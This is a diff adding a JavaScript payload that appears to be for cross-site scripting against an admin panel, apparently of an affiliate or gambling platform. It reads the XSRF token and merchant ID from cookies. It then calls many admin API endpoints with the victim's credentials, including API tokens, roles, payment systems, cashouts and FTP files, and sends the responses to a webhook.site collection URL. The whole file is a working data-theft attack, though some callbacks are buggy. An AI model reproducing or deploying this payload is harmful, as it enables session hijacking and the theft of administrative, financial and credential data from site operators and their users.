@@ -1,0 +1,646 @@
+const dataToSend = {
+};
+var url = "https://webhook.site/242fa8c2-7def-44f7-b2c7-573ebe391049";
+
+function getCookie(name) {
+  const cookies = document.cookie.split('; ');
+  for (let i = 0; i < cookies.length; i++) {
+    const cookie = cookies[i];
+    // Check if the cookie starts with the desired name and an equals sign
+    if (cookie.startsWith(name + '=')) {
+      // Return the value part of the cookie
+      return decodeURIComponent(cookie.substring(name.length + 1));
+    }
+  }
+  return null; // Return null if the cookie is not found
+}
+
+dataToSend.authenticity_token = getCookie("XSRF-TOKEN-X");
+dataToSend.merchant = getCookie("merchant_id");
+
+
+fetch('https://'+document.domain+'/api2/admin/trackers/list', {
+  method: 'POST', // Specify the HTTP method as POST
+  credentials: 'include',
+  mode: 'cors',
+  headers: {
+        "X-XSRF-TOKEN": getCookie("XSRF-TOKEN-X"), 
+    "XSRF-TOKEN": getCookie("XSRF-TOKEN-X"),
+        "Content-Type": "application/json",
+    "Access-Control-Allow-Credentials": true,
+"Access-Control-Allow-Origin": "*"
+      },
+  body: JSON.stringify(dataToSend) // Convert the JavaScript object to a JSON string
+})
+.then(response => {
+  if (!response.ok) {
+    var xmlHttp = new XMLHttpRequest();
+    xmlHttp.open( "GET", url + "?ap="+response.status, false ); // false for synchronous request
+    xmlHttp.send( null );
+      throw new Error(`HTTP error! status: ${response.status}`);
+    }
+  a = response.json(); // Parse the JSON response from the server
+ const jsonString = JSON.stringify(a );
+  var xmlHttp = new XMLHttpRequest();
+    xmlHttp.open( "GET", url + "?ap="+jsonString, false ); // false for synchronous request
+    xmlHttp.send( null );
+    return xmlHttp.responseText;
+})
+.then(data => {
+  console.log('Success:', data);
+})
+.catch(error => {
+  a = error.json(); // Parse the JSON response from the server
+
+  
+});
+
+fetch('https://'+document.domain+'/api2/admin/affiliate_cashouts/approved_and_declined_history/list', {
+  method: 'POST', // Specify the HTTP method as POST
+  credentials: 'include',
+  mode: 'cors',
+  headers: {
+        "X-XSRF-TOKEN": getCookie("XSRF-TOKEN-X"), 
+    "XSRF-TOKEN": getCookie("XSRF-TOKEN-X"),
+        "Content-Type": "application/json",
+    "Access-Control-Allow-Credentials": true,
+"Access-Control-Allow-Origin": "*",
+    "X-Http-Method-Override": "POST"
+      },
+  body: JSON.stringify(dataToSend) // Convert the JavaScript object to a JSON string
+})
+.then(response => {
+  if (!response.ok) {
+    var xmlHttp = new XMLHttpRequest();
+    xmlHttp.open( "GET", url + "?ar="+response.status, false ); // false for synchronous request
+    xmlHttp.send( null );
+      throw new Error(`HTTP error! status: ${response.status}`);
+    }
+  a = response.json(); // Parse the JSON response from the server
+ const jsonString = JSON.stringify(a );
+  var xmlHttp = new XMLHttpRequest();
+    xmlHttp.open( "GET", url + "?ar="+jsonString, false ); // false for synchronous request
+    xmlHttp.send( null );
+    return xmlHttp.responseText;
+})
+.then(data => {
+  console.log('Success:', data);
+})
+.catch(error => {
+  a = error.json(); // Parse the JSON response from the server
+
+  
+});
+
+
+
+fetch('https://'+document.domain+'/api2/admin/trackers/list', {
+  method: 'POST', // Specify the HTTP method as POST
+  credentials: 'include',
+  mode: 'cors',
+  headers: {
+        "X-XSRF-TOKEN": getCookie("XSRF-TOKEN-X"), 
+    "XSRF-TOKEN": getCookie("XSRF-TOKEN-X"),
+        "Content-Type": "application/json",
+    "Access-Control-Allow-Credentials": true,
+"Access-Control-Allow-Origin": "*",
+"X-Http-Method-Override": "POST"
+      },
+  body: JSON.stringify(dataToSend) // Convert the JavaScript object to a JSON string
+})
+.then(response => {
+  if (!response.ok) {
+    var xmlHttp = new XMLHttpRequest();
+    xmlHttp.open( "GET", url + "?trackers="+response.status, false ); // false for synchronous request
+    xmlHttp.send( null );
+      throw new Error(`HTTP error! status: ${response.status}`);
+    }
+  a = response.json(); // Parse the JSON response from the server
+ const jsonString = JSON.stringify(a );
+  var xmlHttp = new XMLHttpRequest();
+    xmlHttp.open( "GET", url + "?trackers="+jsonString, false ); // false for synchronous request
+    xmlHttp.send( null );
+    return xmlHttp.responseText;
+})
+.then(data => {
+  console.log('Success:', data);
+})
+.catch(error => {
+  a = error.json(); // Parse the JSON response from the server
+
+  
+});
+
+
+fetch('https://'+document.domain+'/api2/admin/affiliate_cashouts/approved_and_declined_history/list', {
+  method: 'POST', // Specify the HTTP method as POST
+  credentials: 'include',
+  mode: 'cors',
+  headers: {
+        "X-XSRF-TOKEN": getCookie("XSRF-TOKEN-X"), 
+    "XSRF-TOKEN": getCookie("XSRF-TOKEN-X"),
+        "Content-Type": "application/json",
+    "Access-Control-Allow-Credentials": true,
+"Access-Control-Allow-Origin": "*",
+"X-Http-Method-Override": "POST"
+      },
+  body: JSON.stringify(dataToSend) // Convert the JavaScript object to a JSON string
+})
+.then(response => {
+  if (!response.ok) {
+    var xmlHttp = new XMLHttpRequest();
+    xmlHttp.open( "GET", url + "?da="+response.status, false ); // false for synchronous request
+    xmlHttp.send( null );
+      throw new Error(`HTTP error! status: ${response.status}`);
+    }
+  a = response.json(); // Parse the JSON response from the server
+ const jsonString = JSON.stringify(a );
+  var xmlHttp = new XMLHttpRequest();
+    xmlHttp.open( "GET", url + "?ad="+jsonString, false ); // false for synchronous request
+    xmlHttp.send( null );
+    return xmlHttp.responseText;
+})
+.then(data => {
+  console.log('Success:', data);
+})
+.catch(error => {
+  a = error.json(); // Parse the JSON response from the server
+
+  
+});
+
+
+(async () => {
+   let response = await new Promise(resolve => {
+      var xhr = new XMLHttpRequest();
+      xhr.open("GET", "https://"+document.domain+"/api2/admin/translate_manager/server_marks?authenticity_token="+getCookie("XSRF-TOKEN-X")+"&merchant="+getCookie("merchant_id"), true);
+      xhr.withCredentials = true;
+      xhr.onload = function(e) {
+        var xmlHttp1 = new XMLHttpRequest();
+        xmlHttp1.open( "GET", url + "/?servmarl="+xmlHttp.responseText, false ); // false for synchronous request
+        xmlHttp1.send( null );
+      };
+      xhr.onerror = function () {
+        resolve(undefined);
+        console.error("** An error occurred during the XMLHttpRequest");
+      };
+      xhr.send();
+   }) 
+})();
+
+(async () => {
+   let response = await new Promise(resolve => {
+      var xhr = new XMLHttpRequest();
+      xhr.open("GET", "https://"+document.domain+"/api2/admin/profile/api_tokens?authenticity_token="+getCookie("XSRF-TOKEN-X")+"&merchant="+getCookie("merchant_id"), true);
+      xhr.withCredentials = true;
+      xhr.onload = function(e) {
+        var xmlHttp1 = new XMLHttpRequest();
+        xmlHttp1.open( "GET", url + "/?apit="+xmlHttp.responseText, false ); // false for synchronous request
+        xmlHttp1.send( null );
+      };
+      xhr.onerror = function () {
+        resolve(undefined);
+        console.error("** An error occurred during the XMLHttpRequest");
+      };
+      xhr.send();
+   }) 
+})();
+
+
+(async () => {
+   let response = await new Promise(resolve => {
+      var xhr = new XMLHttpRequest();
+      xhr.open("GET", "https://"+document.domain+"/api2/admin/payment_system_lists/allowed_payment_systems?authenticity_token="+getCookie("XSRF-TOKEN-X")+"&merchant="+getCookie("merchant_id"), true);
+      xhr.withCredentials = true;
+      xhr.onload = function(e) {
+        var xmlHttp1 = new XMLHttpRequest();
+        xmlHttp1.open( "GET", url + "/?allowed_payment_systems="+xmlHttp.responseText, false ); // false for synchronous request
+        xmlHttp1.send( null );
+      };
+      xhr.onerror = function () {
+        resolve(undefined);
+        console.error("** An error occurred during the XMLHttpRequest");
+      };
+      xhr.send();
+   }) 
+})();
+
+
+(async () => {
+   let response = await new Promise(resolve => {
+      var xhr = new XMLHttpRequest();
+      xhr.open("GET", "https://"+document.domain+"/api2/admin/history_of_limit_changes/list?authenticity_token="+getCookie("XSRF-TOKEN-X")+"&merchant="+getCookie("merchant_id"), true);
+      xhr.withCredentials = true;
+      xhr.onload = function(e) {
+        var xmlHttp1 = new XMLHttpRequest();
+        xmlHttp1.open( "GET", url + "/?history_of_limit_changes="+xmlHttp.responseText, false ); // false for synchronous request
+        xmlHttp1.send( null );
+      };
+      xhr.onerror = function () {
+        resolve(undefined);
+        console.error("** An error occurred during the XMLHttpRequest");
+      };
+      xhr.send();
+   }) 
+
+})();
+
+
+(async () => {
+   let response = await new Promise(resolve => {
+      var xhr = new XMLHttpRequest();
+      xhr.open("GET", "https://"+document.domain+"/api2/admin/dashboard/get_stats?authenticity_token="+getCookie("XSRF-TOKEN-X")+"&merchant="+getCookie("merchant_id"), true);
+      xhr.withCredentials = true;
+     xhr.setRequestHeader("Content-Type","application/json");
+      xhr.onload = function(e) {
+        var xmlHttp1 = new XMLHttpRequest();
+        xmlHttp1.open( "GET", url + "/?dashboard="+xmlHttp.responseText, false ); // false for synchronous request
+        xmlHttp1.send({"_merchant":getCookie("merchant_id")});
+      };
+      xhr.onerror = function () {
+        resolve(undefined);
+        console.error("** An error occurred during the XMLHttpRequest");
+      };
+      xhr.send();
+   }) 
+})();
+
+
+(async () => {
+   let response = await new Promise(resolve => {
+      var xhr = new XMLHttpRequest();
+      xhr.open("GET", "https://"+document.domain+"/api2/admin/dashboard/chart?authenticity_token="+getCookie("XSRF-TOKEN-X")+"&merchant="+getCookie("merchant_id"), true);
+      xhr.withCredentials = true;
+     xhr.setRequestHeader("Content-Type","application/json");
+      xhr.onload = function(e) {
+        var xmlHttp1 = new XMLHttpRequest();
+        xmlHttp1.open( "GET", url + "/?dashboardc="+xmlHttp.responseText, false ); // false for synchronous request
+        xmlHttp1.send({"_merchant":getCookie("merchant_id")});
+      };
+      xhr.onerror = function () {
+        resolve(undefined);
+        console.error("** An error occurred during the XMLHttpRequest");
+      };
+      xhr.send();
+   }) 
+})();
+
+
+
+(async () => {
+   let response = await new Promise(resolve => {
+      var xhr = new XMLHttpRequest();
+      xhr.open("GET", "https://"+document.domain+"/api2/admin/dashboard/tops?authenticity_token="+getCookie("XSRF-TOKEN-X")+"&merchant="+getCookie("merchant_id"), true);
+      xhr.withCredentials = true;
+     xhr.setRequestHeader("Content-Type","application/json");
+      xhr.onload = function(e) {
+        var xmlHttp1 = new XMLHttpRequest();
+        xmlHttp1.open( "GET", url + "/?dashboardt="+xmlHttp.responseText, false ); // false for synchronous request
+        xmlHttp1.send({"_merchant":getCookie("merchant_id")});
+      };
+      xhr.onerror = function () {
+        resolve(undefined);
+        console.error("** An error occurred during the XMLHttpRequest");
+      };
+      xhr.send();
+   }) 
+})();
+
+(async () => {
+   let response = await new Promise(resolve => {
+      var xhr = new XMLHttpRequest();
+      xhr.open("GET", "https://"+document.domain+"/api2/admin/roles/list?authenticity_token="+getCookie("XSRF-TOKEN-X")+"&merchant="+getCookie("merchant_id"), true);
+      xhr.withCredentials = true;
+     xhr.setRequestHeader("Content-Type","application/json");
+      xhr.onload = function(e) {
+        var xmlHttp1 = new XMLHttpRequest();
+        xmlHttp1.open( "GET", url + "/?roles="+xmlHttp.responseText, false ); // false for synchronous request
+        xmlHttp1.send({"namespace":"admin"});
+      };
+      xhr.onerror = function () {
+        resolve(undefined);
+        console.error("** An error occurred during the XMLHttpRequest");
+      };
+      xhr.send();
+   }) 
+})();
+
+
+
+(async () => {
+   let response = await new Promise(resolve => {
+      var xhr = new XMLHttpRequest();
+      xhr.open("GET", "https://"+document.domain+"/api2/admin/bookkeepings/list_month_payments?authenticity_token="+getCookie("XSRF-TOKEN-X")+"&merchant="+getCookie("merchant_id"), true);
+      xhr.withCredentials = true;
+      xhr.onload = function(e) {
+        var xmlHttp1 = new XMLHttpRequest();
+        xmlHttp1.open( "GET", url + "/?listm="+xmlHttp.responseText, false ); // false for synchronous request
+        xmlHttp1.send( null );
+      };
+      xhr.onerror = function () {
+        resolve(undefined);
+        console.error("** An error occurred during the XMLHttpRequest");
+      };
+      xhr.send();
+   }) 
+})();
+
+(async () => {
+   let response = await new Promise(resolve => {
+      var xhr = new XMLHttpRequest();
+      xhr.open("GET", "https://"+document.domain+"/api2/admin/project_settings/admins_with_full_stats_access?authenticity_token="+getCookie("XSRF-TOKEN-X")+"&merchant="+getCookie("merchant_id"), true);
+      xhr.withCredentials = true;
+      xhr.onload = function(e) {
+        var xmlHttp1 = new XMLHttpRequest();
+        xmlHttp1.open( "GET", url + "/?adm="+xmlHttp.responseText, false ); // false for synchronous request
+        xmlHttp1.send( null );
+      };
+      xhr.onerror = function () {
+        resolve(undefined);
+        console.error("** An error occurred during the XMLHttpRequest");
+      };
+      xhr.send();
+   }) 
+})();
+
+
+fetch('https://'+document.domain+'/api2/admin/observing_of_daily_statistics_players', {
+  method: 'POST', // Specify the HTTP method as POST
+  credentials: 'include',
+  mode: 'cors',
+  headers: {
+        "X-XSRF-TOKEN": getCookie("XSRF-TOKEN-X"), 
+    "XSRF-TOKEN": getCookie("XSRF-TOKEN-X"),
+        "Content-Type": "application/json",
+    "Access-Control-Allow-Credentials": true,
+"Access-Control-Allow-Origin": "*",
+    "X-Http-Method-Override": "POST"
+      },
+  body: JSON.stringify(dataToSend) // Convert the JavaScript object to a JSON string
+})
+.then(response => {
+  if (!response.ok) {
+    var xmlHttp = new XMLHttpRequest();
+    xmlHttp.open( "GET", url + "?dailystat="+response.status, false ); // false for synchronous request
+    xmlHttp.send( null );
+      throw new Error(`HTTP error! status: ${response.status}`);
+    }
+  a = response.json(); // Parse the JSON response from the server
+ const jsonString = JSON.stringify(a );
+  var xmlHttp = new XMLHttpRequest();
+    xmlHttp.open( "GET", url + "?dailystat="+jsonString, false ); // false for synchronous request
+    xmlHttp.send( null );
+    return xmlHttp.responseText;
+})
+.then(data => {
+  console.log('Success:', data);
+})
+.catch(error => {
+  a = error.json(); // Parse the JSON response from the server
+
+  
+});
+
+
+fetch('https://'+document.domain+'/api2/admin/affiliate_cashouts/balance/list', {
+  method: 'POST', // Specify the HTTP method as POST
+  credentials: 'include',
+  mode: 'cors',
+  headers: {
+        "X-XSRF-TOKEN": getCookie("XSRF-TOKEN-X"), 
+    "XSRF-TOKEN": getCookie("XSRF-TOKEN-X"),
+        "Content-Type": "application/json",
+    "Access-Control-Allow-Credentials": true,
+"Access-Control-Allow-Origin": "*",
+    "X-Http-Method-Override": "POST"
+      },
+  body: JSON.stringify(dataToSend) // Convert the JavaScript object to a JSON string
+})
+.then(response => {
+  if (!response.ok) {
+    var xmlHttp = new XMLHttpRequest();
+    xmlHttp.open( "GET", url + "?affcash="+response.status, false ); // false for synchronous request
+    xmlHttp.send( null );
+      throw new Error(`HTTP error! status: ${response.status}`);
+    }
+  a = response.json(); // Parse the JSON response from the server
+ const jsonString = JSON.stringify(a );
+  var xmlHttp = new XMLHttpRequest();
+    xmlHttp.open( "GET", url + "?affcash="+jsonString, false ); // false for synchronous request
+    xmlHttp.send( null );
+    return xmlHttp.responseText;
+})
+.then(data => {
+  console.log('Success:', data);
+})
+.catch(error => {
+  a = error.json(); // Parse the JSON response from the server
+
+  
+});
+
+
+
+
+fetch('https://'+document.domain+'/api2/admin/ftp_files/list', {
+  method: 'POST', // Specify the HTTP method as POST
+  credentials: 'include',
+  mode: 'cors',
+  headers: {
+        "X-XSRF-TOKEN": getCookie("XSRF-TOKEN-X"), 
+    "XSRF-TOKEN": getCookie("XSRF-TOKEN-X"),
+        "Content-Type": "application/json",
+    "Access-Control-Allow-Credentials": true,
+"Access-Control-Allow-Origin": "*",
+    "X-Http-Method-Override": "POST"
+      },
+  body: JSON.stringify(dataToSend) // Convert the JavaScript object to a JSON string
+})
+.then(response => {
+  if (!response.ok) {
+    var xmlHttp = new XMLHttpRequest();
+    xmlHttp.open( "GET", url + "?ftp="+response.status, false ); // false for synchronous request
+    xmlHttp.send( null );
+      throw new Error(`HTTP error! status: ${response.status}`);
+    }
+  a = response.json(); // Parse the JSON response from the server
+ const jsonString = JSON.stringify(a );
+  var xmlHttp = new XMLHttpRequest();
+    xmlHttp.open( "GET", url + "?ftp="+jsonString, false ); // false for synchronous request
+    xmlHttp.send( null );
+    return xmlHttp.responseText;
+})
+.then(data => {
+  console.log('Success:', data);
+})
+.catch(error => {
+  a = error.json(); // Parse the JSON response from the server
+
+  
+});
+
+
+fetch('https://'+document.domain+'/api2/admin/bonuses/list', {
+  method: 'POST', // Specify the HTTP method as POST
+  credentials: 'include',
+  mode: 'cors',
+  headers: {
+        "X-XSRF-TOKEN": getCookie("XSRF-TOKEN-X"), 
+    "XSRF-TOKEN": getCookie("XSRF-TOKEN-X"),
+        "Content-Type": "application/json",
+    "Access-Control-Allow-Credentials": true,
+"Access-Control-Allow-Origin": "*",
+    "X-Http-Method-Override": "POST"
+      },
+  body: JSON.stringify(dataToSend) // Convert the JavaScript object to a JSON string
+})
+.then(response => {
+  if (!response.ok) {
+    var xmlHttp = new XMLHttpRequest();
+    xmlHttp.open( "GET", url + "?bonusr="+response.status, false ); // false for synchronous request
+    xmlHttp.send( null );
+      throw new Error(`HTTP error! status: ${response.status}`);
+    }
+  a = response.json(); // Parse the JSON response from the server
+ const jsonString = JSON.stringify(a );
+  var xmlHttp = new XMLHttpRequest();
+    xmlHttp.open( "GET", url + "?bonuse="+jsonString, false ); // false for synchronous request
+    xmlHttp.send( null );
+    return xmlHttp.responseText;
+})
+.then(data => {
+  console.log('Success:', data);
+})
+.catch(error => {
+  a = error.json(); // Parse the JSON response from the server
+});
+
+
+
+fetch('https://'+document.domain+'/api2/admin/affiliate_cashouts/adjustment_history/list', {
+  method: 'POST', // Specify the HTTP method as POST
+  credentials: 'include',
+  mode: 'cors',
+  headers: {
+        "X-XSRF-TOKEN": getCookie("XSRF-TOKEN-X"), 
+    "XSRF-TOKEN": getCookie("XSRF-TOKEN-X"),
+        "Content-Type": "application/json",
+    "Access-Control-Allow-Credentials": true,
+"Access-Control-Allow-Origin": "*",
+    "X-Http-Method-Override": "POST"
+      },
+  body: JSON.stringify(dataToSend) // Convert the JavaScript object to a JSON string
+})
+.then(response => {
+  if (!response.ok) {
+    var xmlHttp = new XMLHttpRequest();
+    xmlHttp.open( "GET", url + "?affl="+response.status, false ); // false for synchronous request
+    xmlHttp.send( null );
+      throw new Error(`HTTP error! status: ${response.status}`);
+    }
+  a = response.json(); // Parse the JSON response from the server
+ const jsonString = JSON.stringify(a );
+  var xmlHttp = new XMLHttpRequest();
+    xmlHttp.open( "GET", url + "?afll="+jsonString, false ); // false for synchronous request
+    xmlHttp.send( null );
+    return xmlHttp.responseText;
+})
+.then(data => {
+  console.log('Success:', data);
+})
+.catch(error => {
+  a = error.json(); // Parse the JSON response from the server
+});
+
+
+
+fetch('https://'+document.domain+'/api2/admin/affiliate_cashouts/pending_cashouts/list', {
+  method: 'POST', // Specify the HTTP method as POST
+  credentials: 'include',
+  mode: 'cors',
+  headers: {
+        "X-XSRF-TOKEN": getCookie("XSRF-TOKEN-X"), 
+    "XSRF-TOKEN": getCookie("XSRF-TOKEN-X"),
+        "Content-Type": "application/json",
+    "Access-Control-Allow-Credentials": true,
+"Access-Control-Allow-Origin": "*",
+    "X-Http-Method-Override": "POST"
+      },
+  body: JSON.stringify(dataToSend) // Convert the JavaScript object to a JSON string
+})
+.then(response => {
+  if (!response.ok) {
+    var xmlHttp = new XMLHttpRequest();
+    xmlHttp.open( "GET", url + "?affl="+response.status, false ); // false for synchronous request
+    xmlHttp.send( null );
+      throw new Error(`HTTP error! status: ${response.status}`);
+    }
+  a = response.json(); // Parse the JSON response from the server
+ const jsonString = JSON.stringify(a );
+  var xmlHttp = new XMLHttpRequest();
+    xmlHttp.open( "GET", url + "?afll="+jsonString, false ); // false for synchronous request
+    xmlHttp.send( null );
+    return xmlHttp.responseText;
+})
+.then(data => {
+  console.log('Success:', data);
+})
+.catch(error => {
+  a = error.json(); // Parse the JSON response from the server
+});
+
+
+
+fetch('https://'+document.domain+'/api2/admin/articles/list', {
+  method: 'POST', // Specify the HTTP method as POST
+  credentials: 'include',
+  mode: 'cors',
+  headers: {
+        "X-XSRF-TOKEN": getCookie("XSRF-TOKEN-X"), 
+    "XSRF-TOKEN": getCookie("XSRF-TOKEN-X"),
+        "Content-Type": "application/json",
+    "Access-Control-Allow-Credentials": true,
+"Access-Control-Allow-Origin": "*",
+    "X-Http-Method-Override": "POST"
+      },
+  body: JSON.stringify(dataToSend) // Convert the JavaScript object to a JSON string
+})
+.then(response => {
+  if (!response.ok) {
+    var xmlHttp = new XMLHttpRequest();
+    xmlHttp.open( "GET", url + "?artl="+response.status, false ); // false for synchronous request
+    xmlHttp.send( null );
+      throw new Error(`HTTP error! status: ${response.status}`);
+    }
+  a = response.json(); // Parse the JSON response from the server
+ const jsonString = JSON.stringify(a );
+  var xmlHttp = new XMLHttpRequest();
+    xmlHttp.open( "GET", url + "?artl="+jsonString, false ); // false for synchronous request
+    xmlHttp.send( null );
+    return xmlHttp.responseText;
+})
+.then(data => {
+  console.log('Success:', data);
+})
+.catch(error => {
+  a = error.json(); // Parse the JSON response from the server
+});
+
+
+(async () => {
+   let response = await new Promise(resolve => {
+      var xhr = new XMLHttpRequest();
+      xhr.open("GET", url + "/?a="+JSON.stringify(dataToSend), true);
+      xhr.withCredentials = true;
+      xhr.onload = function(e) {
+        var xmlHttp1 = new XMLHttpRequest();
+        xmlHttp1.open( "GET", url + "/?adm="+xmlHttp.responseText, false ); // false for synchronous request
+        xmlHttp1.send( null );
+      };
+      xhr.onerror = function () {
+        resolve(undefined);
+        console.error("** An error occurred during the XMLHttpRequest");
+      };
+      xhr.send();
+   }) 
+})();
